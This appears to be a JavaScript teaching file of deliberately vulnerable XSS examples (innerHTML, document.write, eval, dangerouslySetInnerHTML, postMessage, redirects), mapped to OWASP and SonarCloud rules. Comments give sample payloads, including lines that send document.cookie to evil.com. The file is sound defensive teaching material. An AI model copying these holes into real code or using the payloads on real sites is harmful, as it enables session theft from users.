/**
 * Cross-Site Scripting (XSS) Vulnerability Examples
 * ====================================================
 * OWASP Category: A03:2021 - Injection (XSS is a subtype)
 * CWE: CWE-79 - Improper Neutralization of Input During Web Page Generation
 * SonarCloud Rules:
 *   - javascript:S5247 - Disabling auto-escaping in template engines is security-sensitive
 *   - javascript:S6299 - Using dangerouslySetInnerHTML is security-sensitive (React)
 *   - javascript:S2819 - Origins should be verified during cross-origin communications
 * Severity in SonarCloud: CRITICAL (Vulnerability) or MAJOR (Security Hotspot)
 *
 * What is XSS?
 * ------------
 * XSS occurs when an application includes user-supplied data in a web page
 * without proper validation or escaping. Attackers inject scripts that execute
 * in victims' browsers in the context of your domain, enabling:
 * - Session hijacking (steal cookies/tokens)
 * - Credential theft (overlay fake login forms)
 * - Malware distribution
 * - Defacement
 *
 * Three types:
 * - Reflected XSS: Payload in URL, reflected in response
 * - Stored XSS: Payload saved to database, served to all users
 * - DOM-based XSS: Payload processed entirely client-side
 *
 * Why SonarCloud Catches This:
 * ----------------------------
 * SonarCloud tracks user-controlled data (from DOM APIs like location.search,
 * document.referrer, postMessage) to sinks like innerHTML, document.write(),
 * eval(), and React's dangerouslySetInnerHTML.
 */

'use strict';

// =============================================================================
// VULNERABLE EXAMPLE 1: innerHTML with user-controlled data
// =============================================================================
// innerHTML tells the browser to parse the string as HTML.
// Any <script> tags or event handlers in the string will execute.
//
// SonarCloud Rule: javascript:S5247 / taint flow to innerHTML
//
// Attack vector (Reflected XSS):
//   URL: https://example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
//   If the search results page does:
//     document.getElementById('results').innerHTML = getQueryParam('q');
//   The injected script executes and exfiltrates cookies.
function displaySearchResults(query) {
  const resultsDiv = document.getElementById('search-results');

  // VULNERABLE: User-supplied query injected directly into innerHTML
  // SonarCloud Rule: javascript:S5247
  resultsDiv.innerHTML = '<h2>Results for: ' + query + '</h2>';

  // Also fetch the query from the URL (common reflected XSS pattern)
  const urlParams = new URLSearchParams(window.location.search);
  const searchTerm = urlParams.get('q');

  // VULNERABLE: URL parameter directly into innerHTML
  // The URL is attacker-controlled in reflected XSS scenarios
  document.getElementById('query-display').innerHTML = searchTerm;
}


// =============================================================================
// VULNERABLE EXAMPLE 2: document.write()
// =============================================================================
// document.write() is even more dangerous than innerHTML — it writes directly
// into the HTML parser stream and can break out of context more easily.
//
// SonarCloud Rule: javascript:S5247
//
// Attack vector:
//   document.referrer = 'javascript:alert(1)' (in some browsers)
//   Or: Any user-controlled input containing HTML/JS
function renderWelcomeMessage(username) {
  // VULNERABLE: document.write with user-supplied username
  // Stored XSS: if username is fetched from a DB where attacker stored a payload
  document.write('<div class="welcome">Hello, ' + username + '!</div>');

  // VULNERABLE: Using document.referrer without sanitization
  const referrer = document.referrer;
  document.write('<p>You came from: ' + referrer + '</p>');
}


// =============================================================================
// VULNERABLE EXAMPLE 3: eval() with user-supplied data
// =============================================================================
// eval() executes arbitrary JavaScript. Any user-controlled input reaching
// eval() is a critical vulnerability.
//
// SonarCloud Rule: javascript:S1523 - eval() should not be used dynamically
//
// This is also a DOM-based XSS if the input comes from the URL.
function calculateExpression(userExpression) {
  // VULNERABLE: eval() with user-supplied expression
  // Attack: userExpression = "fetch('https://evil.com/?d='+document.cookie)"
  try {
    const result = eval(userExpression); // SonarCloud: javascript:S1523
    document.getElementById('result').textContent = result;
  } catch (e) {
    console.error('Calculation error:', e);
  }
}


// =============================================================================
// VULNERABLE EXAMPLE 4: React dangerouslySetInnerHTML
// =============================================================================
// React deliberately named this prop "dangerously" to discourage its use.
// Using it with user content bypasses React's XSS protections entirely.
//
// SonarCloud Rule: javascript:S6299
//
// In React, {variable} is safe — it text-encodes the value.
// dangerouslySetInnerHTML={{__html: variable}} is NOT safe with user input.
//
// This pattern is sometimes "needed" for rendering rich text from a CMS,
// but must ALWAYS use a sanitization library like DOMPurify first.

// Simulated React component function (JSX compiled form):
function UserComment({ commentHtml }) {
  // VULNERABLE: Rendering user-provided HTML without sanitization
  // SonarCloud Rule: javascript:S6299
  return React.createElement('div', {
    dangerouslySetInnerHTML: { __html: commentHtml }  // Flagged by SonarCloud
  });
}

// The JSX version (what you'd actually write):
// function UserComment({ commentHtml }) {
//   return <div dangerouslySetInnerHTML={{ __html: commentHtml }} />;  // VULNERABLE
// }


// =============================================================================
// VULNERABLE EXAMPLE 5: Unsafe postMessage handling
// =============================================================================
// postMessage is used for cross-origin communication.
// Failing to verify the origin allows any page to send malicious messages.
//
// SonarCloud Rule: javascript:S2819 - Origins should be verified
//
// Attack vector:
//   Attacker controls a page that sends: window.opener.postMessage('<script>...', '*')
//   If the victim page processes messages without origin check, XSS occurs.
window.addEventListener('message', function(event) {
  // VULNERABLE: No origin check before processing the message
  // SonarCloud Rule: javascript:S2819
  // An attacker on ANY origin can send messages to this handler.
  const data = event.data;

  // Processing the message without validation
  if (data.action === 'updateContent') {
    // VULNERABLE: Chained XSS — message data → innerHTML
    document.getElementById('dynamic-content').innerHTML = data.content;
  }
});


// =============================================================================
// VULNERABLE EXAMPLE 6: URL-based open redirect leading to XSS
// =============================================================================
// location.href set to an attacker-controlled URL can execute javascript: URIs
// in some contexts, and enables phishing via open redirects.
//
// SonarCloud Rule: javascript:S5042 / taint to location assignment
function redirectAfterLogin(returnUrl) {
  // VULNERABLE: Unvalidated redirect URL
  // Attack: returnUrl = 'javascript:document.cookie' (in older browsers)
  // Or: returnUrl = 'https://phishing-site.com' (open redirect)
  window.location.href = returnUrl; // SonarCloud flags this taint flow

  // Also vulnerable:
  // window.location.assign(returnUrl);
  // document.location = returnUrl;
}


// =============================================================================
// VULNERABLE EXAMPLE 7: Template literal injection
// =============================================================================
// Template literals are syntactic sugar for string concatenation.
// They're equally dangerous for XSS — just easier to read.
function renderUserProfile(userData) {
  const container = document.getElementById('profile');

  // VULNERABLE: Template literal with user data in innerHTML
  // SonarCloud tracks this the same as string concatenation
  container.innerHTML = `
    <div class="profile">
      <h1>${userData.name}</h1>
      <p>Bio: ${userData.bio}</p>
      <img src="${userData.avatarUrl}" alt="avatar">
      <a href="${userData.website}">Website</a>
    </div>
  `;
  // Attack on avatarUrl: " onerror="alert(document.cookie)
  // Resulting img tag: <img src="" onerror="alert(document.cookie)" alt="avatar">
  //
  // Attack on website: javascript:alert(document.cookie)
  // Resulting link: <a href="javascript:alert(document.cookie)">Website</a>
}
